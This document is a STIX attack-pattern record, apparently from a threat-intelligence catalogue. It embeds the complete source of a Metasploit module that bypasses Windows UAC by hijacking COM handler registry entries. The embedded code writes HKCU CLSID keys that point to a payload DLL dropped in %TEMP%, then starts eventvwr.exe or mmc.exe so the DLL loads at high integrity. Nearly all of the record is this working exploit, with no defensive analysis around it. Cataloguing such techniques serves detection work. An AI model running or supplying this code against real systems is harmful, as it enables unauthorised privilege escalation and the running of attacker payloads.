{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--14aabc72-6670-4bc8-8c8a-7ebe552ff32f",
    "created": "2024-08-14T16:49:11.47219Z",
    "modified": "2024-08-14T16:49:11.472194Z",
    "name": "Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)",
    "description": " This module will bypass Windows UAC by creating COM handler registry entries in the HKCU hive. When certain high integrity processes are loaded, these registry entries are referenced resulting in the process loading user-controlled DLLs. These DLLs contain the payloads that result in elevated sessions. Registry key modifications are cleaned up after payload invocation.  This module requires the architecture of the payload to match the OS, but the current low-privilege Meterpreter session architecture can be different. If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process.  This module invokes the target binary via cmd.exe on the target. Therefore if cmd.exe access is restricted, this module will not run correctly.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/bypassuac_comhijack.rb",
            "external_id": "bypassuac_comhijack.rb"
        },
        {
            "source_name": "reference",
            "url": "https://wikileaks.org/ciav7p1/cms/page_13763373.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/FuzzySecurity/Defcon25/Defcon25_UAC-0day-All-Day_v1.2.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Post::Windows::Priv\n  include Post::Windows::Registry\n  include Post::Windows::Runas\n  include Post::Windows::Version\n  include Exploit::FileDropper\n\n  CLSID_PATH = 'HKCU\\\\Software\\\\Classes\\\\CLSID'.freeze\n  DEFAULT_VAL_NAME = ''.freeze # This maps to \"(Default)\"\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)',\n        'Description' => %q{\n          This module will bypass Windows UAC by creating COM handler registry entries in the\n          HKCU hive. When certain high integrity processes are loaded, these registry entries\n          are referenced resulting in the process loading user-controlled DLLs. These DLLs\n          contain the payloads that result in elevated sessions. Registry key modifications\n          are cleaned up after payload invocation.\n\n          This module requires the architecture of the payload to match the OS, but the\n          current low-privilege Meterpreter session architecture can be different. If\n          specifying EXE::Custom your DLL should call ExitProcess() after starting your\n          payload in a separate process.\n\n          This module invokes the target binary via cmd.exe on the target. Therefore if\n          cmd.exe access is restricted, this module will not run correctly.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Matt Nelson', # UAC bypass discovery and research\n          'b33f',           # UAC bypass discovery and research\n          'OJ Reeves'       # MSF module\n        ],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'Targets' => [\n          ['Automatic', {}]\n        ],\n        'DefaultTarget' => 0,\n        'References' => [\n          ['URL', 'https://wikileaks.org/ciav7p1/cms/page_13763373.html'],\n          ['URL', 'https://github.com/FuzzySecurity/Defcon25/Defcon25_UAC-0day-All-Day_v1.2.pdf']\n        ],\n        'DisclosureDate' => '1900-01-01',\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ]\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    version_info = get_version_info\n    vprint_status(\"System OS Detected: #{version_info.product_name}\")\n    # return CheckCode::Safe('UAC is not enabled') unless is_uac_enabled?\n    if version_info.build_number.between?(::Msf::WindowsVersion::Win7_SP0, ::Msf::WindowsVersion::Win10_1903)\n      return CheckCode::Appears\n    end\n\n    return CheckCode::Safe\n  end\n\n  def exploit\n    # Make sure we have a sane payload configuration\n    if sysinfo['Architecture'] != payload_instance.arch.first\n      fail_with(Failure::BadConfig, \"#{payload_instance.arch.first} payload selected for #{sysinfo['Architecture']} system\")\n    end\n\n    registry_view = REGISTRY_VIEW_NATIVE\n    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86\n      registry_view = REGISTRY_VIEW_64_BIT\n    end\n\n    # Validate that we can actually do things before we bother\n    # doing any more work\n    check_permissions!\n\n    case get_uac_level\n    when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,\n        UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,\n        UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT\n      fail_with(Failure::NotVulnerable,\n                \"UAC is set to 'Always Notify'. This module does not bypass this setting, exiting...\")\n    when UAC_DEFAULT\n      print_good('UAC is set to Default')\n      print_good('BypassUAC can bypass this setting, continuing...')\n    when UAC_NO_PROMPT\n      print_warning('UAC set to DoNotPrompt - using ShellExecute \"runas\" method instead')\n      shell_execute_exe\n      return\n    end\n\n    payload = generate_payload_dll({ dll_exitprocess: true })\n    commspec = expand_path('%COMSPEC%')\n    dll_name = expand_path(\"%TEMP%\\\\#{rand_text_alpha(8)}.dll\")\n    hijack = hijack_com(registry_view, dll_name)\n\n    unless hijack && hijack[:cmd_path]\n      fail_with(Failure::Unknown, 'Unable to hijack COM')\n    end\n\n    begin\n      print_status(\"Targeting #{hijack[:name]} via #{hijack[:root_key]} ...\")\n      print_status(\"Uploading payload to #{dll_name} ...\")\n      write_file(dll_name, payload)\n      register_file_for_cleanup(dll_name)\n\n      print_status(\"Executing high integrity process #{expand_path(hijack[:cmd_path])}\")\n      args = \"/c #{expand_path(hijack[:cmd_path])}\"\n      args << \" #{hijack[:cmd_args]}\" if hijack[:cmd_args]\n\n      # Launch the application from cmd.exe instead of directly so that we can\n      # avoid the dreaded 740 error (elevation required)\n      client.sys.process.execute(commspec, args, { 'Hidden' => true })\n\n      # Wait a copule of seconds to give the payload a chance to fire before cleaning up\n      Rex.sleep(5)\n\n      handler(client)\n    ensure\n      print_status('Cleaning up registry; this can take some time...')\n      registry_deletekey(hijack[:root_key], registry_view)\n    end\n  end\n\n  # TODO: Add more hijack points when they're known.\n  # TODO: when more class IDs are found for individual hijackpoints\n  # they can be added to the array of class IDs.\n  @@hijack_points = [\n    {\n      name: 'Event Viewer',\n      cmd_path: '%WINDIR%\\System32\\eventvwr.exe',\n      class_ids: ['0A29FF9E-7F9C-4437-8B11-F424491E3931']\n    },\n    {\n      name: 'Computer Managment',\n      cmd_path: '%WINDIR%\\System32\\mmc.exe',\n      cmd_args: 'CompMgmt.msc',\n      class_ids: ['0A29FF9E-7F9C-4437-8B11-F424491E3931']\n    }\n  ]\n\n  #\n  # Perform the hijacking of COM class IDS. This function chooses a random\n  # application target and a random class id associated with it before\n  # modifying the registry.\n  #\n  def hijack_com(registry_view, dll_path)\n    target = @@hijack_points.sample\n    target_clsid = target[:class_ids].sample\n    root_key = \"#{CLSID_PATH}\\\\{#{target_clsid}}\"\n    inproc_key = \"#{root_key}\\\\InProcServer32\"\n    shell_key = \"#{root_key}\\\\ShellFolder\"\n\n    registry_createkey(root_key, registry_view)\n    registry_createkey(inproc_key, registry_view)\n    registry_createkey(shell_key, registry_view)\n\n    registry_setvaldata(inproc_key, DEFAULT_VAL_NAME, dll_path, 'REG_SZ', registry_view)\n    registry_setvaldata(inproc_key, 'ThreadingModel', 'Apartment', 'REG_SZ', registry_view)\n    registry_setvaldata(inproc_key, 'LoadWithoutCOM', '', 'REG_SZ', registry_view)\n    registry_setvaldata(shell_key, 'HideOnDesktop', '', 'REG_SZ', registry_view)\n    registry_setvaldata(shell_key, 'Attributes', 0xf090013d, 'REG_DWORD', registry_view)\n\n    {\n      name: target[:name],\n      cmd_path: target[:cmd_path],\n      cmd_args: target[:cmd_args],\n      root_key: root_key\n    }\n  end\n\n  def check_permissions!\n    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?\n\n    # Check if you are an admin\n    vprint_status('Checking admin status...')\n    admin_group = is_in_admin_group?\n\n    unless is_in_admin_group?\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    end\n\n    print_status('UAC is Enabled, checking level...')\n    if admin_group.nil?\n      print_error('Either whoami is not there or failed to execute')\n      print_error('Continuing under assumption you already checked...')\n    elsif admin_group\n      print_good('Part of Administrators group! Continuing...')\n    else\n      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')\n    end\n\n    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]\n      fail_with(Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "1900-01-01",
    "x_mitre_platforms": [
        "['win']"
    ]
}